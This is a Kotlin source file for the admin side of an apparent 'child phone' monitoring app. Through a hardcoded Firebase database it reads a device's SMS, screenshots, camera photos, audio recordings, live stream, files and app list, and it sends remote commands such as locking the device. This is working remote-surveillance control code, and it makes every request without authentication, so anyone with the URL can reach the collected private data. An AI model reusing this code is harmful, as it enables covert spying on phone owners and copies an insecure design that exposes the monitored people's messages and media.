package com.example.admin

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException

class FirebaseAdminConnector {
    private val client = OkHttpClient()
    private var rootUrl = "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com"

    fun updateRootUrl(url: String) {
        rootUrl = url.trim().removeSuffix("/")
    }

    fun getRootUrl(): String = rootUrl

    // Get all registered devices
    suspend fun getDiscoveredDevices(): List<Device> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/devices.json")
            .get()
            .build()
        try {
            val devicesList = mutableListOf<Device>()
            val foundKeys = mutableSetOf<String>()
            
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    val code = response.code
                    val message = response.message
                    val errorBody = response.body?.string() ?: ""
                    throw IOException("HTTP $code: $message / Details: $errorBody")
                }
                
                val bodyStr = response.body?.string()
                if (bodyStr != null && bodyStr != "null" && bodyStr.isNotBlank()) {
                    val trimmed = bodyStr.trim()
                    if (trimmed.startsWith("{")) {
                        val json = JSONObject(bodyStr)
                        val keys = json.keys()
                        while (keys.hasNext()) {
                            val key = keys.next()
                            if (key == "null" || key.isBlank()) continue
                            foundKeys.add(key)
                            val childObj = json.optJSONObject(key)
                            
                            val deviceName = childObj?.optString("deviceName")?.takeIf { it.isNotBlank() && it != "null" }
                                ?: "هاتف طفل ($key)"
                            val battery = childObj?.optInt("battery", 90) ?: 90
                            val lastActive = childObj?.optLong("lastActive", 0L) ?: 0L
                            val storageUsed = childObj?.optLong("storageUsed", 4L * 1024 * 1024 * 1024) ?: (4L * 1024 * 1024 * 1024)
                            val storageTotal = childObj?.optLong("storageTotal", 64L * 1024 * 1024 * 1024) ?: (64L * 1024 * 1024 * 1024)
                            val isLocked = childObj?.optBoolean("isLocked", false) ?: false
                            
                            devicesList.add(
                                Device(
                                    id = key,
                                    name = deviceName,
                                    battery = battery,
                                    lastActive = lastActive,
                                    storageUsed = storageUsed,
                                    storageTotal = storageTotal,
                                    isLocked = isLocked
                                )
                            )
                        }
                    } else if (trimmed.startsWith("[")) {
                        val arr = JSONArray(bodyStr)
                        for (i in 0 until arr.length()) {
                            val childObj = arr.optJSONObject(i)
                            val key = childObj?.optString("id")?.takeIf { it.isNotBlank() } ?: "device_$i"
                            foundKeys.add(key)
                            val deviceName = childObj?.optString("deviceName")?.takeIf { it.isNotBlank() && it != "null" }
                                ?: "هاتف طفل ($key)"
                            val battery = childObj?.optInt("battery", 90) ?: 90
                            val lastActive = childObj?.optLong("lastActive", 0L) ?: 0L
                            val storageUsed = childObj?.optLong("storageUsed", 4L * 1024 * 1024 * 1024) ?: (4L * 1024 * 1024 * 1024)
                            val storageTotal = childObj?.optLong("storageTotal", 64L * 1024 * 1024 * 1024) ?: (64L * 1024 * 1024 * 1024)
                            val isLocked = childObj?.optBoolean("isLocked", false) ?: false
                            
                            devicesList.add(
                                Device(
                                    id = key,
                                    name = deviceName,
                                    battery = battery,
                                    lastActive = lastActive,
                                    storageUsed = storageUsed,
                                    storageTotal = storageTotal,
                                    isLocked = isLocked
                                )
                            )
                        }
                    }
                }
            }
            
            // Auto-discover devices that might have nodes under other tables but aren't registered under /devices node:
            val extraTables = listOf(
                "commands", "sms", "screenshots", "camera_photos", "audio_records", 
                "live_stream", "installed_apps", "files", "security_alerts", "command_responses"
            )
            for (table in extraTables) {
                val req = Request.Builder()
                    .url("$rootUrl/$table.json?shallow=true")
                    .get()
                    .build()
                try {
                    client.newCall(req).execute().use { resp ->
                        if (resp.isSuccessful) {
                            val bodyBytesStr = resp.body?.string()
                            if (bodyBytesStr != null && bodyBytesStr != "null" && bodyBytesStr.isNotBlank()) {
                                val json = JSONObject(bodyBytesStr)
                                val keys = json.keys()
                                while (keys.hasNext()) {
                                    val key = keys.next()
                                    if (key != "null" && !key.isNullOrBlank() && !foundKeys.contains(key)) {
                                        foundKeys.add(key)
                                        // Auto-discovered device with default starting values
                                        devicesList.add(
                                            Device(
                                                id = key,
                                                name = "جهاز طفل ($key)",
                                                battery = 95,
                                                lastActive = System.currentTimeMillis() - 10000, // active/online
                                                storageUsed = 4L * 1024 * 1024 * 1024,
                                                storageTotal = 64L * 1024 * 1024 * 1024,
                                                isLocked = false
                                            )
                                        )
                                    }
                                }
                            }
                        }
                    }
                } catch(e: Exception) {
                    Log.e("FirebaseConnector", "Shallow fetch error for table: $table", e)
                }
            }
            
            return@withContext devicesList
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "General error fetching devices", e)
            throw e
        }
    }

    // Force updates lock status directly on Devices/token/isLocked
    suspend fun updateLockInDatabase(deviceToken: String, isLocked: Boolean): Boolean = withContext(Dispatchers.IO) {
        val url = "$rootUrl/devices/$deviceToken/isLocked.json"
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = isLocked.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .put(body)
            .build()
        try {
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error updating lock status on DB", e)
            return@withContext false
        }
    }

    // Create command under commands/token
    suspend fun sendCommandToChild(
        deviceToken: String, 
        commandType: String, 
        additionalParams: Map<String, Any> = emptyMap()
    ): Boolean = withContext(Dispatchers.IO) {
        val commandId = System.currentTimeMillis().toString()
        val url = "$rootUrl/commands/$deviceToken.json"
        
        val commandJson = JSONObject().apply {
            put("id", commandId)
            put("command", commandType)
            put("status", "pending")
            put("timestamp", System.currentTimeMillis())
            additionalParams.forEach { (key, value) ->
                put(key, value)
            }
        }

        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = commandJson.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .put(body) // Overwrite to prevent backlog and trigger child sync instantly
            .build()

        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful && (commandType == "lock_device" || commandType == "unlock_device")) {
                    // Update the local isLocked state directly in Firebase for consistency
                    updateLockInDatabase(deviceToken, commandType == "lock_device")
                }
                return@withContext response.isSuccessful
            }
        } catch (e: IOException) {
            Log.e("FirebaseConnector", "Error sending command", e)
            return@withContext false
        }
    }

    // Read the command execution response
    suspend fun getCommandResponse(deviceToken: String): Pair<String, String>? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/command_responses/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                
                val json = JSONObject(bodyStr)
                val status = json.optString("status", "unknown")
                val message = json.optString("message", "")
                return@withContext Pair(status, message)
            }
        } catch (e: Exception) {
            return@withContext null
        }
    }

    // Fetch sms logs from sms/$token
    suspend fun getSmsLogs(deviceToken: String): List<SmsLog> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/sms/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()

                val logs = mutableListOf<SmsLog>()
                // Parse either as Array or map of objects
                if (bodyStr.trim().startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        logs.add(parseSmsObject(i.toString(), obj))
                    }
                } else {
                    val json = JSONObject(bodyStr)
                    val keys = json.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = json.optJSONObject(key) ?: continue
                        logs.add(parseSmsObject(key, obj))
                    }
                }
                return@withContext logs.sortedByDescending { it.timestamp }
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error fetching SMS logs", e)
            return@withContext emptyList()
        }
    }

    private fun parseSmsObject(id: String, obj: JSONObject): SmsLog {
        return SmsLog(
            id = id,
            sender = obj.optString("sender", "Unknown"),
            body = obj.optString("body", ""),
            timestamp = obj.optLong("timestamp", System.currentTimeMillis()),
            type = obj.optString("type", "incoming")
        )
    }

    // Fetch security alerts from security_alerts/$token
    suspend fun getSecurityAlerts(deviceToken: String): List<SecurityAlert> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/security_alerts/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()

                val list = mutableListOf<SecurityAlert>()
                if (bodyStr.trim().startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(parseAlertObject(i.toString(), obj))
                    }
                } else {
                    val json = JSONObject(bodyStr)
                    val keys = json.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = json.optJSONObject(key) ?: continue
                        list.add(parseAlertObject(key, obj))
                    }
                }
                return@withContext list.sortedByDescending { it.timestamp }
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error fetching alerts", e)
            return@withContext emptyList()
        }
    }

    private fun parseAlertObject(id: String, obj: JSONObject): SecurityAlert {
        return SecurityAlert(
            id = id,
            title = obj.optString("title", "ALERT"),
            message = obj.optString("message", ""),
            timestamp = obj.optLong("timestamp", System.currentTimeMillis())
        )
    }

    // Delete security alerts node to clear
    suspend fun clearSecurityAlerts(deviceToken: String): Boolean = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/security_alerts/$deviceToken.json")
            .delete()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            return@withContext false
        }
    }

    // Fetch installed apps list from installed_apps/$token
    suspend fun getInstalledApps(deviceToken: String): List<InstalledApp> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/installed_apps/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()

                val apps = mutableListOf<InstalledApp>()
                if (bodyStr.trim().startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        apps.add(
                            InstalledApp(
                                name = obj.optString("name", "Unknown App"),
                                packageName = obj.optString("package", "com.example"),
                                isSystem = obj.optBoolean("isSystem", false)
                            )
                        )
                    }
                } else {
                    val json = JSONObject(bodyStr)
                    val keys = json.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = json.optJSONObject(key) ?: continue
                        apps.add(
                            InstalledApp(
                                name = obj.optString("name", "Unknown App"),
                                packageName = obj.optString("package", key),
                                isSystem = obj.optBoolean("isSystem", false)
                            )
                        )
                    }
                }
                return@withContext apps.sortedBy { it.name.lowercase() }
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error fetching apps list", e)
            return@withContext emptyList()
        }
    }

    // Fetch remote file list from files/$token
    suspend fun getFileSystem(deviceToken: String): List<FileItem> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/files/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()

                val items = mutableListOf<FileItem>()
                if (bodyStr.trim().startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        items.add(parseFileItem(obj))
                    }
                } else {
                    val json = JSONObject(bodyStr)
                    val keys = json.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = json.optJSONObject(key) ?: continue
                        items.add(parseFileItem(obj))
                    }
                }
                // Sort directories first, then alphabetically
                return@withContext items.sortedWith(compareBy<FileItem> { !it.isDir }.thenBy { it.name.lowercase() })
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error reading remote file tree", e)
            return@withContext emptyList()
        }
    }

    private fun parseFileItem(obj: JSONObject): FileItem {
        return FileItem(
            name = obj.optString("name", "Unknown File"),
            path = obj.optString("path", ""),
            isDir = obj.optBoolean("isDir", false),
            size = obj.optLong("size", 0L),
            date = obj.optString("date", "N/A")
        )
    }

    // Fetch screenshots/$token
    suspend fun getScreenshot(deviceToken: String): MediaItem? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/screenshots/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                
                val json = JSONObject(bodyStr)
                val base64 = json.optString("base64", "")
                if (base64.isBlank()) return@withContext null
                val timestamp = json.optLong("timestamp", System.currentTimeMillis())
                
                return@withContext MediaItem(
                    id = "screenshot_${timestamp}",
                    base64 = base64,
                    timestamp = timestamp,
                    type = "screenshot"
                )
            }
        } catch (e: Exception) {
            return@withContext null
        }
    }

    // Fetch camera_photos/$token
    suspend fun getCameraPhoto(deviceToken: String): MediaItem? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/camera_photos/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                
                val json = JSONObject(bodyStr)
                val base64 = json.optString("base64", "")
                if (base64.isBlank()) return@withContext null
                val timestamp = json.optLong("timestamp", System.currentTimeMillis())
                val camera = json.optString("camera", "back")
                
                return@withContext MediaItem(
                    id = "camera_${timestamp}",
                    base64 = base64,
                    timestamp = timestamp,
                    type = "camera",
                    cameraType = camera
                )
            }
        } catch (e: Exception) {
            return@withContext null
        }
    }

    // Fetch audio_records/$token
    suspend fun getAudioRecord(deviceToken: String): MediaItem? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/audio_records/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                
                val json = JSONObject(bodyStr)
                val base64 = json.optString("base64", "")
                if (base64.isBlank()) return@withContext null
                val timestamp = json.optLong("timestamp", System.currentTimeMillis())
                
                return@withContext MediaItem(
                    id = "audio_${timestamp}",
                    base64 = base64,
                    timestamp = timestamp,
                    type = "audio"
                )
            }
        } catch (e: Exception) {
            return@withContext null
        }
    }

    // Fetch live stream state from live_stream/$token
    suspend fun getLiveStreamState(deviceToken: String): LiveStreamState? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/live_stream/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                
                val json = JSONObject(bodyStr)
                val isActive = json.optBoolean("isActive", false)
                val image = json.optString("image", "")
                val timestamp = json.optLong("timestamp", 0L)
                val error = json.optString("error", null).let { if (it == "null" || it.isBlank()) null else it }
                
                return@withContext LiveStreamState(
                    isActive = isActive,
                    image = if (image.isBlank()) null else image,
                    timestamp = timestamp,
                    error = error
                )
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error getting live stream state", e)
            return@withContext null
        }
    }
     
    // Pairing simulation / Force pairing a simulation token
    suspend fun registerNewDeviceToken(deviceToken: String, deviceName: String): Boolean = withContext(Dispatchers.IO) {
        val url = "$rootUrl/devices/$deviceToken.json"
        val deviceJson = JSONObject().apply {
            put("deviceName", deviceName)
            put("battery", 85)
            put("lastActive", System.currentTimeMillis())
            put("storageUsed", 12L * 1024 * 1024 * 1024) // 12GB
            put("storageTotal", 64L * 1024 * 1024 * 1024) // 64GB
            put("isLocked", false)
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = deviceJson.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .put(body)
            .build()
        try {
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error manually connecting token", e)
            return@withContext false
        }
    }
}
